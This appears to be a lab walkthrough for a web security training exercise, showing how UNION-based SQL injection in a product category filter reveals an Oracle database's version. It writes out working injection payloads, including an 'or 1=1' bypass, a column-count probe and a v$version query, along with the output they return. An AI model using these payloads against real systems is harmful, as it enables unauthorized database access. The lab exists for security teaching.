# SQL Injection Attack: Querying the Database Type and Version on Oracle

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

---

### **Key Consideration: Querying in Oracle**

In Oracle databases, every `SELECT` statement must specify a table to query from. If your `UNION SELECT` attack does not reference a table, you must include the `FROM` keyword followed by a valid table name. Oracle provides a built-in table called `dual` that can be used for this purpose. For example:
```sql
UNION SELECT 'abc' FROM dual
```

---

### **Steps to Perform the Attack**

#### **Step 1: Analyze the Query Structure**
By injecting the payload:
```
/filter?category=Gifts'--
```
The application likely executes a query like:
```sql
SELECT description, content 
FROM posts 
WHERE category = 'Gifts';
```
This query:
- Returns two columns: `description` and `content`.

#### **Step 2: Determine the Number of Columns**
To find the number of columns in the original query, inject:
```
/filter?category=Gifts'+union+all+select+NULL,NULL+FROM+dual--
```
If no errors occur, the query has two columns.

#### **Step 3: Extract Database Version**
Oracle databases store version information in tables like `v$version` and `v$instance`. To retrieve the version string:
1. Use the `v$version` table:
   ```sql
   SELECT banner FROM v$version;
   ```
2. Inject the payload:
   ```
   /filter?category=Gifts'+union+all+select+'1',banner+FROM+v$version--
   ```

#### **Step 4: Handle Potential Errors**
Using the `v$instance` table might result in an error:
```
SELECT version FROM v$instance;
```
Avoid this if the server rejects queries against `v$instance`.

---

### **Valid Payloads**

#### **Initial Test Payloads**:
- Display 4 items in "Gifts" category:
  ```
  /filter?category=Gifts'--
  ```
- Display all items using a bypass:
  ```
  /filter?category=Gifts'+or+1=1--
  ```

#### **Determine Column Count**:
- Use:
  ```
  /filter?category=Gifts'+union+all+select+NULL,NULL+FROM+dual--
  ```

#### **Retrieve Database Version**:
- Use `v$version`:
  ```
  /filter?category=Gifts'+union+all+select+'1',banner+FROM+v$version--
  ```

---

### **References**

- [Examining the Database Using SQL Injection](https://portswigger.net/web-security/sql-injection/examining-the-database)
- [SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

---

### **Illustrations**

#### **Initial Display (Description and Content)**:
![img](images/SQL%20injection%20attack,%20querying%20the%20database%20type%20and%20version%20on%20Oracle/1.png)

#### **Validating Column Count**:
![img](images/SQL%20injection%20attack,%20querying%20the%20database%20type%20and%20version%20on%20Oracle/2.png)

#### **Retrieving Database Version**:
Using the payload:
```
/filter?category=Gifts'+union+all+select+'1',banner+FROM+v$version--
```

The query returns the database version:
```
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production
```
